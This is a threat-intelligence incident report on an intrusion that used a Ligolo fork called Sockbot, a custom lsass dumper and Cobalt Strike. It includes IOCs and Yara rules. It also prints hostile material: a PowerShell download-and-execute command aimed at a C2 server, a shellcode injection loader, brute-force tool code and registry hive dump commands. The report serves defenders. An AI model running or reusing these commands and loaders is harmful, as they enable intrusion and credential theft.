{
    "id": "8f0cbd83-4958-4ea1-b5bf-e4573edff2eb",
    "created_at": "2022-10-25T16:48:17.363228Z",
    "updated_at": "2025-03-27T02:16:14.137093Z",
    "deleted_at": null,
    "sha1_hash": "f4698039b0d5cbee7cf460e831199a24ec7ebd8e",
    "title": "Sockbot in GoLand – Linking APT Groups with Ransomware Gangs",
    "authors": "",
    "file_creation_date": "2022-03-03T21:02:38Z",
    "file_modification_date": "2022-03-03T21:02:38Z",
    "file_size": 1181117,
    "plain_text": "# Sockbot in GoLand\n\n### Linking APT Groups with Ransomware Gangs\n\nAuthors:\n\nFelipe Duarte\n\nIdo Naor\n\nDate:\n\nMarch 9, 2022\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n## Table of Contents\n\nSockbot in GoLand .................................................................................................................................. 1\n\nExecutive Summary ............................................................................................................................. 3\n\nTechnical Details .................................................................................................................................. 6\n\nTimeline ............................................................................................................................................. 6\n\nInitial Access ..................................................................................................................................... 6\n\nDiscovery ........................................................................................................................................... 7\n\nCredential Access ............................................................................................................................ 7\n\nPersistence & Command and Control ....................................................................................... 11\n\nExecution ......................................................................................................................................... 14\n\nConclusions ......................................................................................................................................... 16\n\nIndicators of Compromise ................................................................................................................ 17\n\nTactics, Techniques and Procedures ............................................................................................. 20\n\nReferences ........................................................................................................................................... 21\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Executive Summary\n\nOur incident response team had responded to malicious activity in one of our clients'\nnetwork infrastructure. A compromised Secure Access instance was probing other network\ndevices using SoftPerfect Network Scanner and ADFind. These tools have been used in the\npast by multiple threat actors, including nation-state sponsored, for discovery reasons.\nInvestigating further into the malicious activity, we saw that the patient zero legitimately\naccessed the network via SSL-VPN, which pointed to a possible credential theft that\nallowed attackers to gain access to the instance in question. On top of the previously\naforementioned tools, AccountRestore was used to brute force network users' credentials\nand get access to additional resources. According to the investigation, this set of tools,\nplus the standard binaries used by threat actors to steal credentials (Mimikatz and\nLaZagne), allowed attackers to map the existing infrastructure and assisted them in the\nattempts to move laterally.\n\nWhat drew our attention the most were two GoLang-compiled Windows executables which\nseemed to be customized by the threat actors to perform the attack. The first one, was\nnamed as lsassDumper, which was specifically designed to dump the memory of the lsass\nprocess and exfiltrate the results to the free file transfer service transfer.sh. The second\nbinary was detected as a Ligolo fork, named as Sockbot by its creators. This new binary\ncombines the standard Ligolo TCP/SOCKS5 reverse tunneling functionalities with a new set\nof functions that allows it to set persistence and “call-back-home” without the need for\ncommand-line parameters. This improves the security of threat actors when executing their\nattack, without risking any eavesdrop attempts from forensics investigators or any security\ntool monitoring network activity.\n\nTaking over machines, attackers used available RDP connections (visible to the internet\nwith the help of Sockbot) and continued deploying their set of tools to gain more visibility,\nsteal credentials, escalate privileges locally and tighten their persistence. The next step of\nthe attack involved Powershell scripts which utilized its WebClient’s DownloadString\nfunction, to drop CobaltStrike beacons.\n\nIt is yet unclear what the attackers were looking for, nevertheless we were able to contain\nthe attack in its early stages and completely block the threat; However, based on the tools,\ntactics and different techniques seen during the incident, we believe it was for the purpose\nof gaining full network control to establish a ransomware attack. The use of several of the\nTTPs identified in this intrusion has been previously covered in other threat intelligence\nreports and it has been related to different APT and Ransomware groups as shown in the\nfollowing diagram.\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n_Figure 1. Summary of the OSINT reports found containing references to the tools detected by our incident response team. At the_\n\n_top, the time in which the report was published; At the bottom, the company that created the report; In orange, the name of the_\n_actor which the attack was associated to; In gray, common software used during the attacks and in green, the unique tools found_\n\n_by Security Joes in this intrusion._\n\nWe strongly believe that the attackers behind this operation are linked to a Russianspeaking ransomware group. In addition to the overlap that exists between the tools used\nduring this attack and the common ransomware toolkit, the binary AccountRestore\ncontains hardcoded references written in Russian language. It is worth mentioning that the\nLigolo fork (Sockbot) is unique to this attack, which lead us to believe that threat actors\nare taking tools used by other groups (such as MuddyWater[1]) and adding their personal\nsignature to them.\n\nIn this report we would like to expand the details within the incident and tools, including\nadditional IOCs which could assist other security teams in detecting operations with similar\nTTPs.\n\n1 https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-int.html\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nThe report in a nutshell:\n\n   - Stolen credentials and legitimate accounts were abused by attackers to log into the\nvictim’s infrastructure.\n\n   - Tools and techniques employed by threat actors in this intrusion share similarities with the\nstandard Modus Operandi of known Russian-speaking ransomware gangs.\n\n   - Unique GoLang binaries were deployed during the attack, developed in GoLand IDE.\n\n   - The attackers were targeting the gambling/gaming industry in Europe and Center America.\n\nFor more information about Security Joes incident response services, email:\nresponse@securityjoes.com\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Technical Details\n\n##### Timeline\n\nThe attack began on a weekend evening and was activated quickly. It appears that the\nattackers knew early-on that they were either limited on time or would potentially be\ndetected. Within hours of the beginning of the attack, scans for group administrators were\nfollowed by an RDP brute-force and several attempts to harvest credentials. These allowed\nthe attackers access to machines which had privileged users’ sessions running on them.\nThen, a fork of the open-source project Ligolo[2] (named as Sockbot, by the threat actors)\nwas dropped. It beaconed back to its local relay server exposing the internal infrastructure\nvia TCP/SOCKS5 tunnel, which finally let attackers deploy CobaltStrike payloads on each of\nthe compromised assets. Our automated incident response technology, along with accurate\nplaybooks, were able to pick-up the malicious activity as our team contained the infected\nmachines. By cutting the cord and eradicating the threat, we were able to collect the\ntechnical pieces of the unknown attacker without them allegedly reaching their goal, which\nwas suspected to be ransomware.\n\nThe attack can be summarized with the following diagram:\n\n_Figure 2. Sequence of events observed during the incident response._\n\nBelow each of the tactics and techniques used by the threat actors during the attack are\nexplained with their corresponding details.\n\n##### Initial Access\n\nTo get a foothold on the victim's infrastructure, we suspect that the attackers got the\naccess credentials and entered “safely” to the Secure Access instance as a standard\nemployee. The means used to obtain them are still unknown, however once the instance\n\n2 https://github.com/sysdream/ligolo\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nwas compromised it was utilized as an arsenal to download the required set of tools to\nexplore the internal infrastructure.\n\n##### Discovery\n\nNetwork infrastructure was deeply scanned and analyzed by the threat actors with the help\nof the free tools SoftPerfect Network Scanner[3] and ADFind[4]. Details of each of these tools\nare provided below.\n\nSoftPerfect Network Scanner\n\nThis tool developed by SoftPerfect was not meant to be malicious, however it is actively\nused in-the-wild by threat actors to inspect and understand the network architecture of a\nvictim. Nowadays, its usage is tightly related to the basic toolset of several ransomware[5]\ngangs.\n\nThis software was found in the Downloads directory of the compromised user with the\nnames netscan64_.exe and netscanold.exe, as shown in the image below along with\nhundreds of internal communication attempts right after its execution.\n\n_Figure 3. Details of netscan64_.exe execution. At the top, the location of the file is displayed._\n\nThe communication attempts were conducted over different protocols, including but not\nlimited to NetBios (137), SMB (445) and RDP (3389), which indicates it was looking for\nshared locations and additional systems within the network.\n\nADFind\n\nThis free command-line query tool was used to gather information from the Active\nDirectory. It was found in the Downloads directory with the name AdFind.exe.\n\n##### Credential Access\n\nMost of the tools found in this intrusion were focused on compromising user’s credentials.\nThis clearly shows the intensions of the attackers to quickly obtain access to additional\nservices managed by the victim inside the network before starting to move laterally. Below,\nall the binaries used to steal credentials are explained.\n\nAccountRestore\n\n3 https://www.softperfect.com/products/networkscanner/\n4 http://www.joeware.net/freetools/tools/adfind/\n5 https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nA .NET executable providing GUI (Figure 4) to brute force administrator credentials. It\nscans for specific users list and expects a passwords file in text format as attachment for\nguessing users' passwords (see code below).\n```\n public FileLoad_VM()\n {\n  this._syncContext = SynchronizationContext.Current ?? new\n SynchronizationContext();\n  this.fileLoad_model = new FileLoad_Model();\n  this.ListUsers = this.fileLoad_model.ListUsers;\n  this.ListWords = this.fileLoad_model.ListWords;\n  this.fileLoad_model?.Load(Environment.CurrentDirectory + \"\\\\passwords.txt\");\n  this.message = (IMessageShow) new MessageShow();\n  this.GoodList = new ObservableCollection<string>();\n  this.message.LastActiveFileNameChanged += new\n Action<string>(this.Message_LastActiveFileNameChanged);\n  this.fileLoad_model.LoginSucceeded += new\n EventHandler<string>(this.LoginSucceeded);\n  this.fileLoad_model.LeftCount += new EventHandler<double>(this.Progress);\n  this.GoodList.CollectionChanged += new\n NotifyCollectionChangedEventHandler(this.PlaceWhereCollectionChanging);\n  this.OnSearch((object) null);\n }\n\n```\nSpecifically, the GetUser function drew our attention because of a string in the Russian\nlanguage that was embedded in the if not condition, which might be pointing on the origin\nof the tool.\n```\n public void GetUser()\n   {\n    if (this.ListUsers.Count > 0)\n     this.ListUsers.Clear();\n    SecurityIdentifier securityIdentifier = new\n SecurityIdentifier(this.LocalGroupName);\n    string name = securityIdentifier.Translate(typeof\n (NTAccount)).Value.Substring(securityIdentifier.Translate(typeof\n (NTAccount)).Value.LastIndexOf('\\\\'));\n    using (DirectoryEntry directoryEntry1 = new DirectoryEntry(\"WinNT://\" +\n Environment.MachineName + \",computer\"))\n    {\n     try\n     {\n      using (DirectoryEntry directoryEntry2 =\n directoryEntry1.Children.Find(name, \"group\"))\n      {\n       foreach (object adsObject in (IEnumerable)\n directoryEntry2.Invoke(\"Members\", (object[]) null))\n       {\n        DirectoryEntry directoryEntry3 = new DirectoryEntry(adsObject);\n        if (!directoryEntry3.Name.Equals(\"Администраторы домена\"))\n         this.ListUsers.Add(string.Format(\"{0}\\\\{1}\", (object)\n Environment.MachineName, (object) directoryEntry3.Name));\n       }\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n      }\n\n```\nThe string Администраторы **_домена translates to Domain Admins and is referring to_**\nwhether a given user has the directory entry of a Domain Admin.\n\n_Figure 4. Screenshot showing the GUI of the AccountRestore binary taken from VirusTotal._\n\nMimikatz\n\nIt was executed only on one machine for a small period by a user with administrative\nprivileges (Figure 5). The sample is the traditional Mimikatz[6] tool for credential dumping\nfrom machine memory and was found in the Desktop folder with the standard name\nmimikatz.exe.\n\n_Figure 5. Details of mimikatz.exe execution. At the top, the location of the file is displayed._\n\nLaZagne\n\nAs described by its author, LaZagne[7] is an open-source application used to retrieve\npasswords stored on a local computer. It is a Python-based tool that can extract\npasswords from several applications including but not limited to games, web browsers, Wi \n6 https://github.com/ParrotSec/mimikatz\n7 https://github.com/AlessandroZ/LaZagne\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nFi networks, chat, and email clients. It can also dump credentials from the Security, System\nand Sam locations in the HKEY_LOCAL_MACHINE (see Figure 6).\n\n_Figure 6. Windows credentials dump performed by the attackers, using LaZagne._\n\nlsassDumper\n\nAmong all the available tools online to dump the memory of the lsass process, such as\nMimikatz, Dumpert and SharpDump, the threat actors involved in this intrusion decided to\ncreate a custom tool named as lsassDumper. It differentiates from other tools in this\nsegment by being written in GoLang, compiled for Windows environments. In addition, it\nautomatically exfiltrates the results to the free file transfer service transfer.sh (Figure 7).\nThe full URL to where the data is posted, is generated at runtime by the service.\nPotentially, it is not possible to get this information without an actual memory dump of the\nprocess at the time it was executed.\n\n_Figure 7. Snippet of code referencing the transfer.sh service._\n\nAt the time of the investigation, no other public reports were found to reference the\nbehavior of this tool, nor have we found another version of this specific binary.\n\nOur threat intelligence team is constantly looking for clues around the usage of this tool.\nIn addition, we would like to provide the readers with a Yara rule to detect this new\nthreat, if needed. Feel free to share details with us in case you find related samples.\n```\nrule win_golang_stealer_lsass_dumper {\n     meta:\n         author = \"Felipe Duarte, Security Joes\"\n         description = \"Detects Go binary lsassDumper\"\n         hash =\n\"8bb7ae5117eec1db2287ef7812629e88e7e3692d39cc37415dc166bb8d56be03\"\n     strings:\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n         $str1 = \"lsassDumper/main.go\"\n         $str2 = \"main.setSeDebugPrivilege\"\n         $str3 = \"main.uploadLargeFile\"\n         $str4 = \"main.findProcessByName\"\n         $str5 = \"main.RandomString\"\n         $str6 = \"[+] Start uploading %s to transfer.sh\"\n         $str7 = \"[+] Process memory dump successful\"\n     condition:\n         uint16(0) == 0x5A4D and all of them\n}\n\n##### Persistence & Command and Control\n\n```\nUp until this stage of the intrusion, almost all the activities seemed to be human-operated\nand they were mainly focused on the collection of data that could provide the attackers\nwith additional access inside the victim’s infrastructure. Once this information is gathered,\nit is time for the threat actors to set persistence on the compromised assets and create a\nsecure channel to perform the malicious activities without being detected. This was\nachieved through a custom tool named by its developers as Sockbot; Which is nothing\nmore than a slight modification of the open-source tool Ligolo.\n\nA detailed analysis of this new tool is presented below.\n\nSockbot\n\nSockbot is the name given by the threat actors to a GoLang compiled binary for Windows\nenvironments. Its name was found among the strings of the sample (Figure 8). This new\nbinary was classified as a customized fork of the Ligolo reverse tunneling open-source\ntool.\n\n_Figure 8. Embedded development path found in the strings of the sample._\n\nAside from the project name “sockbot”, found in the hardcoded strings, a reference to the\nwell-known and widely used Go development IDE GoLand[8] from JetBrains was also\nspotted. This is an interesting find, which shows the tool kit used by the threat actors\nbehind this intrusion to develop software.\n\nBefore digging into the details of this new customized binary, we need to understand the\ninner workings of its predecessor Ligolo. According to its developers, Ligolo is a simple\nand lightweight tool for establishing SOCKS5 or TCP tunnels from a reverse connection in\ncomplete safety. It was built as a way to easily expose internal assets from a compromised\nnetwork to the internet in a stealthy and secure way.\n\n8 https://www.jetbrains.com/go/\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nLigolo uses two components to work (see Figure 9). On the server side, it needs to run a\nLocal Relay, which is a piece of code responsible for listening and managing incoming\nconnections. On the victim’s side, the execution of an implant is needed; It calls back its\nLocal Relay and starts the TCP/SOCKS5 tunnel.\n\n_Figure 9. Image taken from the Ligolo project documentation._\n\nComparing the new variant (Sockbot) to the original source code available online, the\nthreat actors added several execution checks to avoid multiple instances running at the\nsame time, defined the value of the Local Relay as a hard-coded string to avoid the need\nof passing command line parameters when executing the attack and set the persistence via\na scheduled task (Figure 10).\n\n_Figure 10. Scheduled Task created by the attackers._\n\nOur threat intelligence team is constantly looking for clues around the usage of this tool.\nIn addition, we would like to provide the readers with a Yara rule to detect this new\nthreat, if needed. Feel free to share details with us in case you find related samples.\n```\nrule win_golang_tunnel_ligolo_sockbot {\n meta:\n         author = \"Felipe Duarte, Security Joes\"\n         description = \"Detects Go binary Sockbot\"\n         hash =\n\"7dc13eae4e15869024ec1fd2650e4f8444d53dfa2dd7d302f845cd94289fe5f2\"\n     strings:\n         $str1 = \"main.handleRelay\"\n         $str2 = \"main.verifyTlsCertificate\"\n         $str3 = \"main.FindProcess\"\n         $str4 = \"main.hideConsole\"\n         $str5 = \"main.startSocksProxy\"\n         $str6 = \"main.CreateSchedTask\"\n         $str7 = \"main.relay\"\n         $str8 = \"Connecting to relay server...\"\n         $str9 = \"Could not start SOCKS5 proxy !\"\n     condition:\n         uint16(0) == 0x5A4D and all of them\n\n```\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n}\n\n```\nThe sample found during the intrusion has the value 45.61.138[.]77:5555 hard-coded in\nits strings as the Local Relay (Figure 11), which matches the network activity seen in the\ninfected machines.\n\nLooking for more references of this new Ligolo variant in-the-wild; Two additional samples\nwere found. Both samples shared the same code structure and behavior with Sockbot;\nHowever, at the time they were released, their developers had not used the “sockbot”\nstring in the binary metadata. Its strings only referenced the original Ligolo project, which\nindicates these were early versions of this new threat.\n\n_Figure 11. Snippet of code referencing the Local Relay 45.61.138[.]77:5555._\n\nLooking for additional infrastructure related to this emerging threat, three additional local\nrelays were found:\n\n45.61.138[.]77:8282\n\n146.0.77[.]15:8080\n\n88.66.88[.]165:4163\n\nAmong them, the IP address 146.0.77[.]15 was reported by several sources as an active\nmalware repository, related to several malware families and the popular post-exploitation\nframework CobaltStrike, as shown in the figure below.\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n_Figure 12. Part of the VirusTotal report for IP address 146.0.77[.]15. In it, the references to CobaltStrike are clearly visible._\n\nFinally, the ability to connect to internal services and expose them to internet was\ndetected. For this specific attack, threat actors used the reverse tunnel to expose RDP\nservers (Figure 13) and attempted to move laterally with the help of the credentials\npreviously stolen.\n\n_Figure 13. Internal RDP traffic spawned by Sockbot in the victim’s network._\n\n##### Execution\n\nThe last part the attackers managed to conduct, unrelated to the CobaltStrike findings\nfrom the previous section, was focused on obtaining a deeper and stealthier control over\nthe compromised machines. In this case, threat actors decided to deploy CobaltStrike\nbeacons onto every infected machine. The C2 server for the CobaltStrike loader in this case\nwas http://172.105.239[.]15:80/a2\n\nCobaltStrike Shellcode\n\nThe following CobaltStrike Powershell loader was launched within each of the\ncompromised machines using the following code:\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n \"\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX\n ((new-object net.webclient).downloadstring('http://172.105.239[.]15:80/a2'))\"\"\n\n```\nIt downloaded a second layer of Powershell code, as it is shown below.\n\n_Figure 14. Powershell download string calls remote CobaltStrike shellcode._\n\nThis new Powershell code is the actual malicious payload. Between line 3 and line 23 are\nthe noted parts of the code.\n```\n $DoIt = @'\n $assembly = @\"\n     using System;\n     using System.Runtime.InteropServices;\n     namespace inject {\n          public class func {\n              [Flags] public enum AllocationType { Commit = 0x1000,\n Reserve = 0x2000 }\n              [Flags] public enum MemoryProtection { ExecuteReadWrite =\n 0x40 }\n              [Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }\n              [DllImport(\"kernel32.dll\")] public static extern IntPtr\n VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n              [DllImport(\"kernel32.dll\")] public static extern IntPtr\n CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,\n IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n              [DllImport(\"kernel32.dll\")] public static extern int\n WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);\n          }\n     }\n \"@\n $compiler = New-Object Microsoft.CSharp.CSharpCodeProvider\n $params = New-Object System.CodeDom.Compiler.CompilerParameters\n $params.ReferencedAssemblies.AddRange(@(\"System.dll\",\n [PsObject].Assembly.Location))\n $params.GenerateInMemory = $True\n $result = $compiler.CompileAssemblyFromSource($params, $assembly)\n\n```\nThese lines contain code which is responsible for dynamically compiling C# code in\nruntime. Powershell magic, you may call it. The variable $result contains bytes for the\ncompiled assembly to be loaded later. Running the script in your favorite sandbox will\nresult in the following DLL being compiled:\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n```\n\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe\" /noconfig /fullpaths\n@\"C:\\Users\\admin\\AppData\\Local\\Temp\\gwuzrrsn.cmdline\"\n\n```\nHash of the malicious DLL is in the IOCs table. While dynamically investigating the sample,\nit will probe to the internet on port 80, looking for a pixel file located on the C2 server.\n\nThe HTTP request captured is the following:\n\n_Figure 15. Malicious request generated by the dynamic-compiled DLL._\n\nAt the time of analysis, the response returned by the server did not have any content.\nHowever, in case the server provides the right response, the final shellcode would be\ninjected into the Powershell process and executed in a new thread, with the following\ncode:\n\n$buffer = [inject.func]::VirtualAlloc(0, $var_code.Length + 1, [inject.func+AllocationType]::Reserve -bOr\n\n[inject.func+AllocationType]::Commit, [inject.func+MemoryProtection]::ExecuteReadWrite)\nif ([Bool]!$buffer) {\n$global:result = 3;\nreturn\n}\n\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $buffer, $var_code.Length)\n\n[IntPtr] $thread = [inject.func]::CreateThread(0, 0, $buffer, 0, 0, 0)\nif ([Bool]!$thread) {\n$global:result = 7;\nreturn\n}\n$result2 = [inject.func]::WaitForSingleObject($thread, [inject.func+Time]::Infinite)\n'@\n\nIf ([IntPtr]::size -eq 8) {\nstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\nIEX $DoIt\n}\n\nAn article by Xavier Mertens[9] (@xme) detailed the exact same behavior and was extremely\nhelpful for us during the investigation.\n\n#### Conclusions\n\n9 https://isc.sans.edu/forums/diary/Malicious+PowerShell+Compiling+C+Code+on+the+Fly/24072/\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nThe strategy used by threat actors to access and pivot over the victim’s infrastructure lets\nus see a persistent, sophisticated enemy with some programming skills, red teaming\nexperience and a clear objective in mind, which is far from the regular script kiddie profile.\n\nAlso, based on the behavior, the tools seen in this intrusion and the targeted sectors\n(gambling/gaming industry in Europe and Center America), we concluded that the\nattackers behind this operation are tightly related to a Russian-speaking ransomware gang,\nwhich is taking tools used by other groups (such as MuddyWater) and adding their\npersonal signature to them.\n\nLast but not least, the fact that the entry point for this intrusion was a set of compromised\ncredentials reassures the importance of applying additional access controls for all the\ndifferent assets in any organization.\n\n#### Indicators of Compromise\n\nType Process / File Value Description\n```\n                  cmd.exe /c \"reg.exe save\n                  hklm\\security \n\n```\nCommand lazagne.exe Dumping Windows Credentials[10]\n```\n                  c:\\users\\<USER>\\appdata\\local\\\n                  temp<[a-z]{9,12}>\n                  cmd.exe /c \"reg.exe save\n                  hklm\\sam \n\n```\nCommand lazagne.exe Dumping Windows Credentials\n```\n                  c:\\users\\<USER>\\appdata\\local\\\n                  temp<[a-z]{9,12}>\n                  cmd.exe /c \"reg.exe save\n                  hklm\\system \n\n```\nCommand lazagne.exe Dumping Windows Credentials\n```\n                  c:\\users<USER>\\appdata\\local\\t\n                  emp<[a-z]{9,12}>\n                  \"taskeng.exe {B598BB15-49C5                  4C26-ADCA-01FA8852B68D} S-1-5\n```\nCommand taskeng.exe Persistence via Task Scheduler\n```\n                  18:NT \n                  AUTHORITY\\System:Service:\"\n                  \"\"C:\\WINDOWS\\System32\\WindowsP\n                  owerShell\\v1.0\\powershell.exe\"\n                  -nop -w hidden -c \"IEX ((new\n```\nCommand Powershell.exe `object` Cobalt Strike\n```\n                  net.webclient).downloadstring(\n                  'http://172.105.239[.]15:80/a2\n                  '))\"\"\n                  31eb1de7e840a342fd468e558e5ab6\n\n```\nSHA256 Mimikatz `27bcb4c542a8fe01aec4d5ba01d539`\n```\n                  a0fc\n                  7dc13eae4e15869024ec1fd2650e4f\n\n```\nsocks_45.61.138.7\nSHA256 `8444d53dfa2dd7d302f845cd94289f` Sockbot\n7.exe\n```\n                  e5f2 \n\n```\n10 https://pure.security/dumping-windows-credentials/\n\nThreat Intelligence & Incident Response Team\n\n|Type|Process / File|Value|Description|\n|---|---|---|---|\n|Command|lazagne.exe|cmd.exe /c \"reg.exe save hklm\\security c:\\users\\<USER>\\appdata\\local\\ temp<[a-z]{9,12}>|Dumping Windows Credentials10|\n|Command|lazagne.exe|cmd.exe /c \"reg.exe save hklm\\sam c:\\users\\<USER>\\appdata\\local\\ temp<[a-z]{9,12}>|Dumping Windows Credentials|\n|Command|lazagne.exe|cmd.exe /c \"reg.exe save hklm\\system c:\\users<USER>\\appdata\\local\\t emp<[a-z]{9,12}>|Dumping Windows Credentials|\n|Command|taskeng.exe|\"taskeng.exe {B598BB15-49C5- 4C26-ADCA-01FA8852B68D} S-1-5- 18:NT AUTHORITY\\System:Service:\"|Persistence via Task Scheduler|\n|Command|Powershell.exe|\"\"C:\\WINDOWS\\System32\\WindowsP owerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new- object net.webclient).downloadstring( 'http://172.105.239[.]15:80/a2 '))\"\"|Cobalt Strike|\n|SHA256|Mimikatz|31eb1de7e840a342fd468e558e5ab6 27bcb4c542a8fe01aec4d5ba01d539 a0fc||\n|SHA256|socks_45.61.138.7 7.exe|7dc13eae4e15869024ec1fd2650e4f 8444d53dfa2dd7d302f845cd94289f e5f2|Sockbot|\n\n\n-----\n\n|SHA256|socks.exe|1b77b3cb015c345a09a725191513cd 6e095cd299036110bd4fe4531fcd8d 34eb|Col4|\n|---|---|---|---|\n|SHA256|netscan64_.exe|bb574434925e26514b0daf56b45163 e4c32b5fc52a1484854b315f40fd8f f8d2||\n|SHA256|netscanold.exe|572d88c419c6ae75aeb784ceab327d 040cb589903d6285bbffa77338111a f14b||\n|SHA256|AccountRestore.exe|e97bdf7fafb1cb2a2bf0a4e14f51e1 8a34f3ff2f6f7b99731e93070d5080 1bef||\n|SHA256|lazagne.exe|ed2f501408a7a6e1a854c29c4b0bc5 648a6aa8612432df829008931b3e34 bf56||\n|SHA256|lsass_dumper.exe|8bb7ae5117eec1db2287ef7812629e 88e7e3692d39cc37415dc166bb8d56 be03||\n|SHA256|CobaltStrike shellcode DLL|B0CC3D7C6085167D28D01CCAFE30AE 2A35774675E464BE0E33D400BE7806 AC4E|C:\\Users\\admin\\AppData\\Local\\Te mp\\gwuzrrsn.dll|\n|SHA256|AdFind.exe|c92c158d7c37fea795114fa6491fe5 f145ad2f8c08776b18ae79db811e8e 36a3||\n|SHA256|go.exe|cb3660675a16ddf4c49d2e047684f1 8f5efe10f098e318546eab87d64092 f2a0|Early Sockbot version|\n|SHA256|XVKHE.exe|490998e4f0ce2811f83d4ad0660722 8ac5846da442f1318cc0bffc278a9c 4b10|Early Sockbot version|\n|Filename|accountrestore.zip|--||\n|Filename|adfind.zip|--||\n|Filename|adfind.bat|--||\n|Filename|Passwords.txt|--||\n|IP Address|lsass_dumper.exe|144.76.136[.]153|port 443|\n|IP Address|socks_45.61.138.7 7.exe|45.61.138[.]77|port 5555 / Ligolo Local Relay|\n|IP Address|XVKHE.exe|45.61.138[.]77|port 8282 / Ligolo Local Relay|\n|IP Address|go.exe|146.0.77[.]15|port 8080 / Ligolo Local Relay|\n|IP Address|socks.exe|88.66.88[.]165|port 4163 / Ligolo Local Relay|\n|IP Address|Cobalt Strike Shellcode|172.105.239[.]15|port 443|\n|Link|Cobalt Strike Shellcode|http://172.105.239[.]15/a2||\n\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\nThreat Intelligence & Incident Response Team\n\n\n-----\n\n#### Tactics, Techniques and Procedures\n\nA summary of the tactics, techniques and tools detected by our team while containing this\nincident are provided below:\n\nTactic ID Technique Tools / Details\n```\n                                   Credentials of a SSL-VPN\nInitial Access T1078 Valid Accounts\n                                   instance were compromised.\n               System Network Configuration\nDiscovery T1016 Netscan and ADFind\n               Discovery\nDiscovery T1018 Remote System Discovery Netscan and ADFind\nDiscovery T1046 Network Service Scanning Netscan\nDiscovery T1135 Network Share Discovery Netscan\nDiscovery T1087.002 Account Discovery: Domain Account ADFind\nDiscovery T1482 Domain Trust Discovery ADFind\nDiscovery T1069.002 [Permission Groups Discovery: ] ADFind\n               Domain Groups\nCredential\n          T1110.001 Brute Force: Password Guessing AccountRestore\nAccess\nCredential lsassDumper, mimikatz and\n          T1003 OS Credential Dumping\nAccess LaZagne\nCredential\n          T1555 Credentials from Password Stores LaZagne\nAccess\nLateral\n          T1021 Remote Services Ligolo Fork (Sockbot)\nMovement\nPersistence T1053.005 [Scheduled Task/Job: Scheduled ] Ligolo Fork (Sockbot)\n               Task\nCommand and\n          T1572 Protocol Tunneling Ligolo Fork (Sockbot)\nControl\nExfiltration T1567.002 [Exfiltration Over Web Service: ] lsassDumper\n               Exfiltration to Cloud Storage\nExecution T1059.001 [Command and Scripting ] CobaltStrike Beacon downloader\n               Interpreter: PowerShell\nDefense Evasion T1055 Process Injection CobaltStrike Beacon downloader\n\n```\nThreat Intelligence & Incident Response Team\n\n|Tactic|ID|Technique|Tools / Details|\n|---|---|---|---|\n|Initial Access|T1078|Valid Accounts|Credentials of a SSL-VPN instance were compromised.|\n|Discovery|T1016|System Network Configuration Discovery|Netscan and ADFind|\n|Discovery|T1018|Remote System Discovery|Netscan and ADFind|\n|Discovery|T1046|Network Service Scanning|Netscan|\n|Discovery|T1135|Network Share Discovery|Netscan|\n|Discovery|T1087.002|Account Discovery: Domain Account|ADFind|\n|Discovery|T1482|Domain Trust Discovery|ADFind|\n|Discovery|T1069.002|Permission Groups Discovery: Domain Groups|ADFind|\n|Credential Access|T1110.001|Brute Force: Password Guessing|AccountRestore|\n|Credential Access|T1003|OS Credential Dumping|lsassDumper, mimikatz and LaZagne|\n|Credential Access|T1555|Credentials from Password Stores|LaZagne|\n|Lateral Movement|T1021|Remote Services|Ligolo Fork (Sockbot)|\n|Persistence|T1053.005|Scheduled Task/Job: Scheduled Task|Ligolo Fork (Sockbot)|\n|Command and Control|T1572|Protocol Tunneling|Ligolo Fork (Sockbot)|\n|Exfiltration|T1567.002|Exfiltration Over Web Service: Exfiltration to Cloud Storage|lsassDumper|\n|Execution|T1059.001|Command and Scripting Interpreter: PowerShell|CobaltStrike Beacon downloader|\n|Defense Evasion|T1055|Process Injection|CobaltStrike Beacon downloader|\n\n\n-----\n\n#### References\n\nA summary of the tactics, techniques and tools detected by our team while containing this\nincident are provided below:\n\n  - [https://www.cyber.gov.au/sites/default/files/2020-12/ACSC-Advisory-2020-008-](https://www.cyber.gov.au/sites/default/files/2020-12/ACSC-Advisory-2020-008-Copy-Paste-Compromises.pdf)\n\n[Copy-Paste-Compromises.pdf](https://www.cyber.gov.au/sites/default/files/2020-12/ACSC-Advisory-2020-008-Copy-Paste-Compromises.pdf)\n\n  - [https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-](https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html)\n\n[continues-to-target-organizations-in-t.html](https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html)\n\n  - 